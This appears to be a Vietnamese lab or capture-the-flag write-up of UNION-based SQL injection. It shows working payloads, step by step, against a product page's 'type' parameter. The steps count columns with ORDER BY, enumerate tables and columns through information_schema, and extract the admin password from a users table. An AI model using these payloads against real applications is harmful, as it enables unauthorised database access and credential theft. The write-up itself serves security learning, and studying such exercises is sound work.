## UNION Based SQLi

`Description`: 1 input có thể inject là `type` khi có giá trị tương ứng sẽ hiện ra bảng thông tin.

![image](https://user-images.githubusercontent.com/92881216/220985230-be59ce1e-a5b7-4f4a-a4ca-9ecb7df69910.png)

Đầu tiên test input `type` với payload : `' or '1'='1` thì truy xuất ra được toàn bộ sản phẩm:

![image](https://user-images.githubusercontent.com/92881216/220987891-ccf5aba1-c1a4-432a-b755-84a8b983a2d0.png)

Vì vậy để truy xuất `password` từ 1 bảng khác thì phải khai thác theo `UNION Based`

- Xác định số cột đang có trong bảng hiện tại bằng `order by` với payload `'order by 1-- -` và thử từ 1, 2, 3, ...

Kết quả đến order by 6 thì bắt đầu xuất hiện lỗi, vậy xác định được bảng này có 5 cột.

![image](https://user-images.githubusercontent.com/92881216/220989342-2e381bc9-ed29-453f-a827-bef6ce26217e.png)

Sau đó em sử dụng payload `' union select 1,2,3,4,5 -- `  để xem có echo được ra số nào không và kết quả: 

![image](https://user-images.githubusercontent.com/92881216/220989905-3681eb25-78a9-49a7-9013-f63b220fd567.png)

Vì vậy có thể sử dụng ví trí thứ 2 hoặc 5 để khai thác tiếp.

- Xác định database bằng payload: `' union select 1,database(),3,4,5 -- -` :

![image](https://user-images.githubusercontent.com/92881216/220990302-a19ef335-8095-4d44-99c7-8bb7f27e0016.png)

Vậy biết được database có tên là `kcsc`.

- Xác đinh tên bảng:

Sử dụng payload `' union select 1,GROUP_CONCAT(table_name),3,4,5 +From+information_schema.tables+where+table_schema='kcsc'-- -` với `group_concat()` là hàm sẽ dump ra hết tên các bảng và nối nhau bằng dấu `,`

![image](https://user-images.githubusercontent.com/92881216/220996239-71975fd0-2174-4c28-b6cd-afbca74966d8.png)

Vậy biết được có bảng `products` và `users` và mục tiêu tiếp theo là khai thác vào trong bảng `users`.

- Xác định cột:
Sử dụng payload tượng tự trên: `' union select 1,GROUP_CONCAT(column_name),3,4,5 From information_schema.columns where table_name='users'-- -` :

![image](https://user-images.githubusercontent.com/92881216/220996752-f0d51b61-a2bd-4dbb-920a-2e17c42f037c.png)

- Xác định password:
Sử dụng payload: `' union select 1,password,3,4,5 From users where username ='admin'-- -` :
 
 ![image](https://user-images.githubusercontent.com/92881216/220997281-6adcd020-b94b-4aed-9ab5-89a24aadb305.png)


> password admin: `the_admin_password`
